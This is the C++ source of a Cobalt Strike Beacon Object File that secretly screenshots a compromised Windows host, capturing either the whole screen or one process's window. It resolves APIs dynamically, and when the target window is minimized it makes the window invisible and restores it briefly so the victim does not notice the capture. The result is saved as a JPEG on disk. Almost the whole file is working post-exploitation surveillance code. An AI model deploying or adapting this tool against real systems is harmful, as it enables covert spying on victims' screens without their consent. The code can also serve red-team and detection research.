#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "../_include/bofdefs.h"
#include <gdiplus.h>    

#pragma comment(lib, "User32.lib")

/*

9/2/2025 update


this line was the source of my hatred for MSVC and CobaltStrike for 2 days
https://x.com/codex_tf2/status/1888504670269874667

for whatever reason, adding the 
```
using namespace Gdiplus;
```
line caused MSVC to use COMDAT sections which Beacon for whatever reason doesnt handle well.
But guess what? By sheer luck (and arguably slightly better handling), the TrustedSec COFFLoader
was able to run the BOF just fine.

So i had a fully working BOF that only worked in COFFLoader but not in Beacon for a whole day and a half.
thx (and condolences) to all the unfortunate souls who looked at this error with me

This single line is the cause of the migration from MSVC to mingw.

CodeX
*/
using namespace Gdiplus;

//-------------------------------------------------------------
// Typedefs for the WinAPI functions
//-------------------------------------------------------------
typedef char* (__cdecl *PFN_getenv)(const char*);
static PFN_getenv pgetenv = NULL;
typedef HDC(WINAPI* PFN_CreateDCA)(LPCSTR, LPCSTR, LPCSTR, const DEVMODEA*);
typedef int     (WINAPI* PFN_GetDeviceCaps)(HDC, int);
typedef BOOL(WINAPI* PFN_DeleteDC)(HDC);
typedef int     (WINAPI* PFN_GetObjectA)(HANDLE, int, LPVOID);
typedef HGDIOBJ(WINAPI* PFN_GetStockObject)(int);
typedef HDC(WINAPI* PFN_GetDC)(HWND);
typedef int     (WINAPI* PFN_ReleaseDC)(HWND, HDC);
typedef HDC(WINAPI* PFN_CreateCompatibleDC)(HDC);
typedef HBITMAP(WINAPI* PFN_CreateCompatibleBitmap)(HDC, int, int);
typedef HGDIOBJ(WINAPI* PFN_SelectObject)(HDC, HGDIOBJ);
typedef BOOL(WINAPI* PFN_PrintWindow)(HWND, HDC, UINT);
typedef BOOL(WINAPI* PFN_BitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef BOOL(WINAPI* PFN_ShowWindow)(HWND, int);
typedef LONG(WINAPI* PFN_SetWindowLongA)(HWND, int, LONG);
typedef BOOL(WINAPI* PFN_SetLayeredWindowAttributes)(HWND, COLORREF, BYTE, DWORD);
typedef BOOL(WINAPI* PFN_UpdateWindow)(HWND);
typedef VOID(WINAPI* PFN_Sleep)(DWORD);
typedef BOOL(WINAPI* PFN_GetWindowRect)(HWND, LPRECT);
typedef HANDLE(WINAPI* PFN_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI* PFN_WriteFile) (HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* PFN_CloseHandle)(HANDLE);
typedef HGLOBAL(WINAPI* PFN_GlobalAlloc)(UINT, SIZE_T);
typedef LPVOID(WINAPI* PFN_GlobalLock)(HGLOBAL);
typedef BOOL(WINAPI* PFN_GlobalUnlock)(HGLOBAL);
typedef HGLOBAL(WINAPI* PFN_GlobalFree)(HGLOBAL);
typedef BOOL(WINAPI* PFN_GetWindowPlacement)(HWND, WINDOWPLACEMENT*);
typedef DWORD(WINAPI* PFN_GetWindowThreadProcessId)(HWND, LPDWORD);
typedef BOOL(WINAPI* PFN_EnumWindows)(WNDENUMPROC, LPARAM);
typedef int     (WINAPI* PFN_GetSystemMetrics)(int);
typedef BOOL(WINAPI* PFN_SetWindowPos)(HWND, HWND, int, int, int, int, UINT);
typedef BOOL(WINAPI* PFN_DeleteObject)(HGDIOBJ);
typedef HGDIOBJ(WINAPI* PFN_SelectPalette)(HDC, HPALETTE, BOOL);
typedef UINT(WINAPI* PFN_RealizePalette)(HDC);
typedef int     (WINAPI* PFN_GetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);
typedef BOOL(WINAPI* PFN_IsWindowVisible)(HWND);
typedef DWORD (WINAPI* PFN_GetCurrentProcessId)(void);
typedef BOOL (WINAPI* PFN_ProcessIdToSessionId)(DWORD dwProcessId, DWORD* pSessionId);
typedef BOOL (WINAPI *PFN_GetHandleInformation)(HANDLE, LPDWORD);
//-------------------------------------------------------------
// init my func ptrs
//-------------------------------------------------------------
static PFN_CreateDCA              pCreateDC = NULL;
static PFN_GetDeviceCaps          pGetDeviceCaps = NULL;
static PFN_DeleteDC               pDeleteDC = NULL;
static PFN_GetObjectA             pGetObjectA = NULL;
static PFN_GetStockObject         pGetStockObject = NULL;
static PFN_GetDC                  pGetDC = NULL;
static PFN_ReleaseDC              pReleaseDC = NULL;
static PFN_CreateCompatibleDC     pCreateCompatibleDC = NULL;
static PFN_CreateCompatibleBitmap pCreateCompatibleBitmap = NULL;
static PFN_SelectObject           pSelectObject = NULL;
static PFN_PrintWindow            pPrintWindow = NULL;
static PFN_BitBlt                 pBitBlt = NULL;
static PFN_ShowWindow             pShowWindow = NULL;
static PFN_SetWindowLongA         pSetWindowLongA = NULL;
static PFN_SetLayeredWindowAttributes pSetLayeredWindowAttributes = NULL;
static PFN_UpdateWindow           pUpdateWindow = NULL;
static PFN_Sleep                  pSleep = NULL;
static PFN_GetWindowRect          pGetWindowRect = NULL;
static PFN_CreateFileA            pCreateFileA = NULL;
static PFN_WriteFile              pWriteFile = NULL;
static PFN_CloseHandle            pCloseHandle = NULL;
static PFN_GlobalAlloc            pGlobalAlloc = NULL;
static PFN_GlobalLock             pGlobalLock = NULL;
static PFN_GlobalUnlock           pGlobalUnlock = NULL;
static PFN_GlobalFree             pGlobalFree = NULL;
static PFN_GetWindowPlacement     pGetWindowPlacement = NULL;
static PFN_GetWindowThreadProcessId pGetWindowThreadProcessId = NULL;
static PFN_EnumWindows            pEnumWindows = NULL;
static PFN_GetSystemMetrics       pGetSystemMetrics = NULL;
static PFN_SetWindowPos           pSetWindowPos = NULL;
static PFN_DeleteObject           pDeleteObject = NULL;
static PFN_SelectPalette          pSelectPalette = NULL;
static PFN_RealizePalette         pRealizePalette = NULL;
static PFN_GetDIBits              pGetDIBits = NULL;
static PFN_IsWindowVisible        pIsWindowVisible = NULL;
static PFN_GetCurrentProcessId    pGetCurrentProcessId = NULL;
static PFN_ProcessIdToSessionId   pProcessIdToSessionId = NULL;
static PFN_GetHandleInformation pGetHandleInformation = NULL;
//-------------------------------------------------------------
// Dynamically resolve the required WinAPI functions because winapi limit :(
//-------------------------------------------------------------
void ResolveAPIs(void)
{
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    HMODULE hGdi32 = GetModuleHandleA("gdi32.dll");
    HMODULE hMSVCRT = GetModuleHandleA("msvcrt.dll");
    pgetenv = (PFN_getenv)GetProcAddress(hMSVCRT, "getenv");
    pCreateDC = (PFN_CreateDCA)GetProcAddress(hGdi32, "CreateDCA");
    pGetDeviceCaps = (PFN_GetDeviceCaps)GetProcAddress(hGdi32, "GetDeviceCaps");
    pDeleteDC = (PFN_DeleteDC)GetProcAddress(hGdi32, "DeleteDC");
    pGetObjectA = (PFN_GetObjectA)GetProcAddress(hGdi32, "GetObjectA");
    pGetStockObject = (PFN_GetStockObject)GetProcAddress(hGdi32, "GetStockObject");
    pGetDC = (PFN_GetDC)GetProcAddress(hUser32, "GetDC");
    pReleaseDC = (PFN_ReleaseDC)GetProcAddress(hUser32, "ReleaseDC");
    pCreateCompatibleDC = (PFN_CreateCompatibleDC)GetProcAddress(hGdi32, "CreateCompatibleDC");
    pCreateCompatibleBitmap = (PFN_CreateCompatibleBitmap)GetProcAddress(hGdi32, "CreateCompatibleBitmap");
    pSelectObject = (PFN_SelectObject)GetProcAddress(hGdi32, "SelectObject");
    pPrintWindow = (PFN_PrintWindow)GetProcAddress(hUser32, "PrintWindow");
    pBitBlt = (PFN_BitBlt)GetProcAddress(hGdi32, "BitBlt");
    pShowWindow = (PFN_ShowWindow)GetProcAddress(hUser32, "ShowWindow");
    pSetWindowLongA = (PFN_SetWindowLongA)GetProcAddress(hUser32, "SetWindowLongA");
    pSetLayeredWindowAttributes = (PFN_SetLayeredWindowAttributes)GetProcAddress(hUser32, "SetLayeredWindowAttributes");
    pUpdateWindow = (PFN_UpdateWindow)GetProcAddress(hUser32, "UpdateWindow");
    pSleep = (PFN_Sleep)GetProcAddress(hKernel32, "Sleep");
    pGetWindowRect = (PFN_GetWindowRect)GetProcAddress(hUser32, "GetWindowRect");
    pCreateFileA = (PFN_CreateFileA)GetProcAddress(hKernel32, "CreateFileA");
    pWriteFile = (PFN_WriteFile)GetProcAddress(hKernel32, "WriteFile");
    pCloseHandle = (PFN_CloseHandle)GetProcAddress(hKernel32, "CloseHandle");
    pGlobalAlloc = (PFN_GlobalAlloc)GetProcAddress(hKernel32, "GlobalAlloc");
    pGlobalLock = (PFN_GlobalLock)GetProcAddress(hKernel32, "GlobalLock");
    pGlobalUnlock = (PFN_GlobalUnlock)GetProcAddress(hKernel32, "GlobalUnlock");
    pGlobalFree = (PFN_GlobalFree)GetProcAddress(hKernel32, "GlobalFree");
    pGetWindowPlacement = (PFN_GetWindowPlacement)GetProcAddress(hUser32, "GetWindowPlacement");
    pGetWindowThreadProcessId = (PFN_GetWindowThreadProcessId)GetProcAddress(hUser32, "GetWindowThreadProcessId");
    pEnumWindows = (PFN_EnumWindows)GetProcAddress(hUser32, "EnumWindows");
    pGetSystemMetrics = (PFN_GetSystemMetrics)GetProcAddress(hUser32, "GetSystemMetrics");
    pSetWindowPos = (PFN_SetWindowPos)GetProcAddress(hUser32, "SetWindowPos");
    pDeleteObject = (PFN_DeleteObject)GetProcAddress(hGdi32, "DeleteObject");
    pSelectPalette = (PFN_SelectPalette)GetProcAddress(hGdi32, "SelectPalette");
    pRealizePalette = (PFN_RealizePalette)GetProcAddress(hGdi32, "RealizePalette");
    pGetDIBits = (PFN_GetDIBits)GetProcAddress(hGdi32, "GetDIBits");
    pIsWindowVisible = (PFN_IsWindowVisible)GetProcAddress(hUser32, "IsWindowVisible");
    pGetCurrentProcessId = (PFN_GetCurrentProcessId)GetProcAddress(hKernel32, "GetCurrentProcessId");
    pProcessIdToSessionId = (PFN_ProcessIdToSessionId)GetProcAddress(hKernel32, "ProcessIdToSessionId");
    pGetHandleInformation = (PFN_GetHandleInformation)GetProcAddress(hKernel32, "GetHandleInformation");
}

//-------------------------------------------------------------
// Dynamically resolve more GDI+ functions
//-------------------------------------------------------------
typedef Status(WINAPI* PFN_GdiplusStartup)(ULONG_PTR*, const GdiplusStartupInput*, GdiplusStartupOutput*);
typedef VOID(WINAPI* PFN_GdiplusShutdown)(ULONG_PTR);
typedef Status(WINAPI* PFN_GdipCreateBitmapFromHBITMAP)(HBITMAP, HPALETTE, GpBitmap**);
typedef Status(WINAPI* PFN_GdipDisposeImage)(GpImage*);
typedef Status(WINAPI* PFN_GdipSaveImageToStream)(GpImage*, IStream*, const CLSID*, const EncoderParameters*);

static PFN_GdiplusStartup pGdiplusStartup = NULL;
static PFN_GdiplusShutdown pGdiplusShutdown = NULL;
static PFN_GdipCreateBitmapFromHBITMAP pGdipCreateBitmapFromHBITMAP = NULL;
static PFN_GdipDisposeImage pGdipDisposeImage = NULL;
static PFN_GdipSaveImageToStream pGdipSaveImageToStream = NULL;

void ResolveGdiPlus()
{
    HMODULE hGdiPlus = GetModuleHandleA("gdiplus.dll");
    hGdiPlus = LoadLibraryA("gdiplus.dll");
    pGdiplusStartup = (PFN_GdiplusStartup)GetProcAddress(hGdiPlus, "GdiplusStartup");
    pGdiplusShutdown = (PFN_GdiplusShutdown)GetProcAddress(hGdiPlus, "GdiplusShutdown");
    pGdipCreateBitmapFromHBITMAP = (PFN_GdipCreateBitmapFromHBITMAP)GetProcAddress(hGdiPlus, "GdipCreateBitmapFromHBITMAP");
    pGdipDisposeImage = (PFN_GdipDisposeImage)GetProcAddress(hGdiPlus, "GdipDisposeImage");
    pGdipSaveImageToStream = (PFN_GdipSaveImageToStream)GetProcAddress(hGdiPlus, "GdipSaveImageToStream");
}


//-------------------------------------------------------------
// Convert the given HBITMAP to a JPEG in memory using GDI+
// credit: https://github.com/WKL-Sec/HiddenDesktop/blob/14252f58e3f5379301f0d6334f92f8b96f321a16/client/scmain.c#L125
//-------------------------------------------------------------
BOOL BitmapToJpeg(HBITMAP hBitmap, int quality, BYTE** pJpegData, DWORD* pJpegSize)
{
    ResolveGdiPlus();
    if (!pGdiplusStartup || !pGdiplusShutdown || !pGdipCreateBitmapFromHBITMAP ||
        !pGdipDisposeImage || !pGdipSaveImageToStream)
    {
        return FALSE;
    }


    GdiplusStartupInput gdiplusStartupInput;
    gdiplusStartupInput.GdiplusVersion = 1;
    gdiplusStartupInput.DebugEventCallback = NULL;
    gdiplusStartupInput.SuppressBackgroundThread = FALSE;
    gdiplusStartupInput.SuppressExternalCodecs = FALSE;

    ULONG_PTR gdiplusToken = 0;
    Status stat = pGdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    if (stat != Ok) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GdiplusStartup failed: %d", stat);
        return FALSE;
    }
    GpBitmap* pGpBitmap = NULL;
    stat = pGdipCreateBitmapFromHBITMAP(hBitmap, NULL, &pGpBitmap);
    if (stat != Ok) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GdipCreateBitmapFromHBITMAP failed: %d", stat);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }
    IStream* pStream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] CreateStreamOnHGlobal failed");
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    CLSID clsidEncoderQuality = { 0x1d5be4b5, 0xfa4a, 0x452d, {0x9c,0xdd,0x5d,0xb3,0x51,0x05,0xe7,0xeb} };
    encoderParams.Parameter[0].Guid = clsidEncoderQuality;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].Value = &quality;

    CLSID clsidJPEG = { 0x557cf401, 0x1a04, 0x11d3, {0x9a,0x73,0x00,0x00,0xf8,0x1e,0xf3,0x2e} };

    stat = pGdipSaveImageToStream((GpImage*)pGpBitmap, pStream, &clsidJPEG, &encoderParams);
    if (stat != Ok) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GdipSaveImageToStream failed: %d", stat);
        pStream->Release();
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    LARGE_INTEGER liZero = { 0 };
    ULARGE_INTEGER uliSize = { 0 };
    if (pStream->Seek(liZero, STREAM_SEEK_END, &uliSize) != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Seek to end failed");
        pStream->Release();
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    *pJpegSize = (DWORD)uliSize.QuadPart;
    *pJpegData = (BYTE*)malloc(*pJpegSize);
    if (!*pJpegData) {
        pStream->Release();
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    if (pStream->Seek(liZero, STREAM_SEEK_SET, NULL) != S_OK) {
        free(*pJpegData);
        pStream->Release();
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    ULONG bytesRead = 0;
    if (pStream->Read(*pJpegData, *pJpegSize, &bytesRead) != S_OK || bytesRead != *pJpegSize) {
        free(*pJpegData);
        pStream->Release();
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    pStream->Release();
    pGdipDisposeImage((GpImage*)pGpBitmap);
    pGdiplusShutdown(gdiplusToken);
    return TRUE;
}

//-------------------------------------------------------------
// Save (or download) the given HBITMAP as a JPEG file with the provided filename
//-------------------------------------------------------------
BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName)
{
    ResolveAPIs();

    BYTE* jpegData = NULL;
    DWORD jpegSize = 0;
    int quality = 90;  // adjust JPEG quality (0–100) as desired

    if (!BitmapToJpeg(hBitmap, quality, &jpegData, &jpegSize)) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to convert bitmap to JPEG");
        return FALSE;
    }


    BeaconPrintf(CALLBACK_OUTPUT, "Saving JPEG to disk with filename %s", lpszFileName);
    HANDLE fh = pCreateFileA(lpszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
    FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (fh == INVALID_HANDLE_VALUE) {
        free(jpegData);
        return FALSE;
    }
    DWORD dwWritten;
    pWriteFile(fh, (LPSTR)jpegData, jpegSize, &dwWritten, NULL);
    pCloseHandle(fh);
    free(jpegData);
    return TRUE;
}

//-------------------------------------------------------------
// Callback for EnumWindows. It gets a window handle from a PID.
//-------------------------------------------------------------
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
    /* lParam points to a two–element array:
       index 0: the target PID (stored as LONG_PTR)
       index 1: the found window handle (initially 0)
    */
    LONG_PTR* params = (LONG_PTR*)lParam;
    DWORD targetPid = (DWORD)params[0];
    DWORD windowPid = 0;
    pGetWindowThreadProcessId(hwnd, &windowPid);
    if (windowPid == targetPid && IsWindowVisible(hwnd)) {
        params[1] = (LONG_PTR)hwnd;
        return FALSE;
    }
    return TRUE;
}

//-------------------------------------------------------------
// Given a PID, uses EnumWindows to find a matching window handle.
//-------------------------------------------------------------
HWND FindWindowByPID(DWORD pid, int debug)
{
    ResolveAPIs();
    LONG_PTR params[2];
    params[0] = (LONG_PTR)pid;
    params[1] = 0;
    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Enumerating windows for PID %d", pid);
    EnumWindows(EnumWindowsProc, (LPARAM)&params);
    if (debug) {
        if ((HWND)params[1])
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Found window handle: 0x%p", (HWND)params[1]);
        else
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] No window found for PID %d", pid);
    }
    return (HWND)params[1];
}

//-------------------------------------------------------------
// Capture the given window (by hwnd) into an HBITMAP.
// If the window is minimized, it is temporarily restored.
//-------------------------------------------------------------
HBITMAP CaptureWindow(HWND hwnd, int debug)
{
    ResolveAPIs();
    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Starting CaptureWindow for hwnd 0x%p", hwnd);

    WINDOWPLACEMENT wp = { 0 };
    wp.length = sizeof(WINDOWPLACEMENT);
    if (!pGetWindowPlacement(hwnd, &wp)) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GetWindowPlacement failed");
        return NULL;
    }
    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Window showCmd: %d", wp.showCmd);

    RECT captureRect;
    int width, height;
    BOOL success = FALSE;
    HDC hdcScreen = pGetDC(NULL);
    HDC hdcMem = pCreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = NULL;

    if (wp.showCmd == SW_SHOWMINIMIZED) {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Window is minimized; restoring temporarily for capture");

        LONG exStyle = GetWindowLong(hwnd, GWL_EXSTYLE);
        pSetWindowLongA(hwnd, GWL_EXSTYLE, exStyle | WS_EX_LAYERED | WS_EX_TOOLWINDOW);
        pSetLayeredWindowAttributes(hwnd, 0, 0, LWA_ALPHA);
        pShowWindow(hwnd, SW_RESTORE);
        pUpdateWindow(hwnd);
        pSleep(500);  /* Allow time for rendering */

        if (!pGetWindowRect(hwnd, &captureRect)) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GetWindowRect failed (restored window)");
            goto cleanup;
        }
        width = captureRect.right - captureRect.left;
        height = captureRect.bottom - captureRect.top;
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Restored window dimensions: %d x %d", width, height);
        if (width <= 0 || height <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Invalid window dimensions");
            goto cleanup;
        }
        hBitmap = pCreateCompatibleBitmap(hdcScreen, width, height);
        if (!hBitmap) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to create compatible bitmap");
            goto cleanup;
        }
        pSelectObject(hdcMem, hBitmap);
        success = pPrintWindow(hwnd, hdcMem, PW_RENDERFULLCONTENT);
        if (!success) {
            if (debug)
                BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] PrintWindow failed; falling back to BitBlt");
            success = pBitBlt(hdcMem, 0, 0, width, height,
                hdcScreen, captureRect.left, captureRect.top, SRCCOPY);
            if (!success)
                BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Both PrintWindow and BitBlt failed");
        }
        /* Restore window state */
        pShowWindow(hwnd, SW_MINIMIZE);
        pSetWindowLongA(hwnd, GWL_EXSTYLE, exStyle);
        pSetWindowPos(hwnd, NULL, 0, 0, 0, 0,
            SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_FRAMECHANGED);
    }
    else {
        if (!pGetWindowRect(hwnd, &captureRect)) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GetWindowRect failed");
            goto cleanup;
        }
        width = captureRect.right - captureRect.left;
        height = captureRect.bottom - captureRect.top;
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Window dimensions: %d x %d", width, height);
        if (width <= 0 || height <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Invalid window dimensions");
            goto cleanup;
        }
        hBitmap = pCreateCompatibleBitmap(hdcScreen, width, height);
        if (!hBitmap) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to create compatible bitmap");
            goto cleanup;
        }
        pSelectObject(hdcMem, hBitmap);

        /* Attempt to use PrintWindow to capture the full contents,
           even if the window is in the background */
        success = pPrintWindow(hwnd, hdcMem, PW_RENDERFULLCONTENT);
        if (!success) {
            if (debug)
                BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] PrintWindow failed; falling back to BitBlt");
            success = pBitBlt(hdcMem, 0, 0, width, height,
                hdcScreen, captureRect.left, captureRect.top, SRCCOPY);
            if (!success)
                BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Both PrintWindow and BitBlt failed");
        }
    }

cleanup:
    if (hdcMem)
        pDeleteDC(hdcMem);
    if (hdcScreen)
        pReleaseDC(NULL, hdcScreen);
    if (!success) {
        if (hBitmap)
            pDeleteObject(hBitmap);
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] CaptureWindow failed");
        return NULL;
    }
    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] CaptureWindow succeeded");
    return hBitmap;
}

//-------------------------------------------------------------
// go:
// BOF args:
//   1. Filename 
//   2. Save method: 0 = save to disk, 1 = download via Beacon, 2 = downloadScreenshot.
//   3. PID: if nonzero, capture that window; if zero, capture the full screen.
//-------------------------------------------------------------
#ifdef BOF
void go(char* buff, int len)
{
    int debug = 0; // enable debugging prints
    ResolveAPIs();  // Ensure API pointers are resolved

    datap parser;
    BeaconDataParse(&parser, buff, len);

    char* filename = BeaconDataExtract(&parser, NULL);
    int pid = BeaconDataInt(&parser);

    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] go() called with filename: %s, pid: %d, debug: %d", filename, pid, debug);
    
    BOOL dpi = SetProcessDPIAware(); // Set DPI awareness to fix incomplete screenshots
    
    HBITMAP hBitmap = NULL;
    if (pid != 0) {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Attempting to capture window for PID %d", pid);
        HWND hwnd = FindWindowByPID((DWORD)pid, debug);
        if (hwnd == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Window with PID %d not found", pid);
            return;
        }
        hBitmap = CaptureWindow(hwnd, debug);
        if (hBitmap == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to capture window with PID %d", pid);
            return;
        }
    }
    else {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Capturing full screen");
        int x1 = pGetSystemMetrics(SM_XVIRTUALSCREEN);
        int y1 = pGetSystemMetrics(SM_YVIRTUALSCREEN);
        int w = pGetSystemMetrics(SM_CXVIRTUALSCREEN);
        int h = pGetSystemMetrics(SM_CYVIRTUALSCREEN);
        HDC hScreen = pGetDC(NULL);
        if (hScreen == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] pGetDC(NULL) returned NULL. Last error: %lu", GetLastError());
            return; 
        }
        
        HDC hDC = pCreateCompatibleDC(hScreen);
        if (hDC == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] pCreateCompatibleDC failed. Last error: %lu", GetLastError());
            pReleaseDC(NULL, hScreen); 
            return;
        }
        hBitmap = pCreateCompatibleBitmap(hScreen, w, h);
        if (!hBitmap) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to create full screen bitmap");
            pReleaseDC(NULL, hScreen);
            pDeleteDC(hDC);
            return;
        }
        
        if (debug){
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] GetDC: %p",hScreen);
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] CreateCompatibleDC returned: %p",hDC);
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] CreateCompatibleBitmap returned: %p",hBitmap);
        }
        

        HGDIOBJ old_obj = pSelectObject(hDC, hBitmap);
        if (!pBitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY)) {
            DWORD errorCode = GetLastError();
            BeaconPrintf(CALLBACK_ERROR,
                         "[DEBUG] BitBlt failed for full screen capture. Error code: %lu",
                         errorCode);
        

            BeaconPrintf(CALLBACK_ERROR,
                         "[DEBUG] hDC: %p, hScreen: %p, old_obj: %p",
                         hDC, hScreen, old_obj);
            BeaconPrintf(CALLBACK_ERROR,
                         "[DEBUG] Screen region: x1: %d, y1: %d, width: %d, height: %d",
                         x1, y1, w, h);
        

            if (hScreen == NULL) {
                BeaconPrintf(CALLBACK_ERROR, "[DEBUG] hScreen is NULL (handle invalid)");
            } else {
                DWORD flags = 0;
                if (!pGetHandleInformation(hScreen, &flags)) {
                    DWORD errorCode = GetLastError();
                    BeaconPrintf(CALLBACK_ERROR, "[DEBUG] hScreen appears invalid (pGetHandleInformation failed) - Error code: %lu",errorCode);
                } else {
                    BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] hScreen is valid (flags: 0x%lx)", flags);
                }
            }
        
            // Check hDC
            if (hDC == NULL) {
                BeaconPrintf(CALLBACK_ERROR, "[DEBUG] hDC is NULL (handle invalid)");
            } else {
                DWORD flags = 0;
                if (!pGetHandleInformation(hDC, &flags)) {
                    BeaconPrintf(CALLBACK_ERROR, "[DEBUG] hDC appears invalid (pGetHandleInformation failed) - Error code: %lu",errorCode);
                } else {
                    BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] hDC is valid (flags: 0x%lx)", flags);
                }
            }
        }
        pSelectObject(hDC, old_obj);
        pDeleteDC(hDC);
        pReleaseDC(NULL, hScreen);
    }

    if (hBitmap) {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Captured bitmap successfully; saving as %s", filename);
        if (!SaveHBITMAPToFile(hBitmap, filename))
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to save JPEG");
        else
            BeaconPrintf(CALLBACK_OUTPUT, "Screenshot saved successfully", filename);
        pDeleteObject(hBitmap);
    }
}
#else
void main(int argc, char* argv[])
{
    /* Non-BOF main() implementation (if needed) */
}
#endif